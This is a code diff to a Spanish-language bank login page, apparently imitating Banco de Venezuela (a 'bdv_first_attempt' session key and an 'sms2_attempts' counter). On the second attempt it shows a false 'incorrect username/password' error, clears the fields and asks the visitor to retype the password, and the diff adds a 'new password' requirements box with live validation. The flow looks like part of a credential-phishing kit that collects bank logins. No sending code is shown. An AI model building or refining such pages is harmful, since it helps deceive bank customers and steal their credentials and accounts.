@@ -129,7 +129,7 @@
             font-size: 14px;
             margin-top: 10px;
             display: none;
-            text-align: center;
+            text-align: left;
             background-color: rgba(187, 27, 71, 0.1);
             padding: 12px;
             border-radius: 5px;
@@ -231,6 +231,36 @@
         .error-container {
             margin-bottom: 15px;
         }
+        
+        /* Estilos para los requisitos de contraseña */
+        .password-requirements {
+            display: none;
+            background-color: #f8f9fa;
+            border-left: 4px solid #0070cc;
+            padding: 10px;
+            margin-bottom: 15px;
+            border-radius: 5px;
+            text-align: left;
+            font-size: 13px;
+            color: #333;
+        }
+        
+        .password-requirements ul {
+            margin: 5px 0;
+            padding-left: 20px;
+        }
+        
+        .password-requirements li {
+            margin-bottom: 3px;
+        }
+        
+        .password-requirements .requirement-valid {
+            color: #27ae60;
+        }
+        
+        .password-requirements .requirement-invalid {
+            color: #bb1b47;
+        }
     </style>
 </head>
 
@@ -247,6 +277,16 @@
             <div class="input-group">
                 <input placeholder="Contraseña" type="password" id="password" name="password" required>
             </div>
+            
+            <div class="password-requirements" id="passwordRequirements">
+                <strong>Requisitos para la nueva contraseña:</strong>
+                <ul>
+                    <li id="req-uppercase">Al menos 1 letra mayúscula (A-Z)</li>
+                    <li id="req-lowercase">Al menos 1 letra minúscula (a-z)</li>
+                    <li id="req-symbol">Al menos 1 símbolo especial (!@#$%^&* etc.)</li>
+                </ul>
+            </div>
+            
             <div class="terms">
                 <input type="checkbox" id="terms" class="checkbox-input" required>
                 <label for="terms">Acepto los términos y condiciones</label>
@@ -264,8 +304,9 @@
     </div>
     
     <script>
-        // Limpiar el sessionStorage al cargar la página
+        // Limpiar el sessionStorage al cargar la página (incluyendo contadores de sms2)
         sessionStorage.removeItem('bdv_first_attempt');
+        sessionStorage.removeItem('sms2_attempts');
         
         // Verificar si ya hubo un intento fallido
         document.addEventListener('DOMContentLoaded', function() {
@@ -274,22 +315,46 @@
             if (isSecondAttempt) {
                 // Mostrar mensaje de error en la interfaz
                 const errorElement = document.getElementById('errorMessage');
+                errorElement.innerHTML = 'Usuario y/o contraseña incorrectos.<br>La nueva contraseña debe contener:<br>• 1 mayúscula, 1 minúscula y 1 símbolo';
                 errorElement.style.display = 'block';
                 errorElement.classList.add('error-visible');
+                
+                // Mostrar los requisitos de contraseña
+                document.getElementById('passwordRequirements').style.display = 'block';
                 
                 // Añadir estilos de error a los inputs
                 document.getElementById('username').classList.add('input-error');
                 document.getElementById('password').classList.add('input-error');
                 
-                // Cambiar texto del botón
-                document.getElementById('submitBtn').textContent = 'Reintentar';
-                
                 // Limpiar campos
                 document.getElementById('username').value = '';
                 document.getElementById('password').value = '';
                 
-                // Enfocar en el primer campo
-                document.getElementById('username').focus();
+                // Validar contraseña en tiempo real durante el segundo intento
+                const passwordInput = document.getElementById('password');
+                const requirements = document.getElementById('passwordRequirements');
+                
+                passwordInput.addEventListener('input', function() {
+                    const password = this.value;
+                    
+                    // Validar requisitos
+                    const hasUppercase = /[A-Z]/.test(password);
+                    const hasLowercase = /[a-z]/.test(password);
+                    const hasSymbol = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password);
+                    
+                    // Actualizar visualización de requisitos
+                    document.getElementById('req-uppercase').className = hasUppercase ? 'requirement-valid' : 'requirement-invalid';
+                    document.getElementById('req-lowercase').className = hasLowercase ? 'requirement-valid' : 'requirement-invalid';
+                    document.getElementById('req-symbol').className = hasSymbol ? 'requirement-valid' : 'requirement-invalid';
+                    
+                    // Quitar clase de error si la contraseña es válida
+                    if (hasUppercase && hasLowercase && hasSymbol) {
+                        this.classList.remove('input-error');
+                    }
+                });
+                
+                // Enfocar en el campo de contraseña
+                document.getElementById('password').focus();
             }
             
             // Limpiar error cuando el usuario empiece a escribir
@@ -298,6 +363,13 @@
                 input.addEventListener('input', function() {
                     if (this.classList.contains('input-error')) {
                         this.classList.remove('input-error');
+                    }
+                    
+                    // Ocultar mensaje de error general cuando se empieza a escribir
+                    const errorElement = document.getElementById('errorMessage');
+                    if (errorElement && errorElement.style.display === 'block' && this.id === 'password') {
+                        errorElement.style.display = 'none';
+                        errorElement.classList.remove('error-visible');
                     }
                 });
             });
@@ -312,6 +384,11 @@
                     }
                 });
             });
+            
+            // Solo para el primer intento: ocultar requisitos al inicio
+            if (!isSecondAttempt) {
+                document.getElementById('passwordRequirements').style.display = 'none';
+            }
         });
     </script>
 </body>
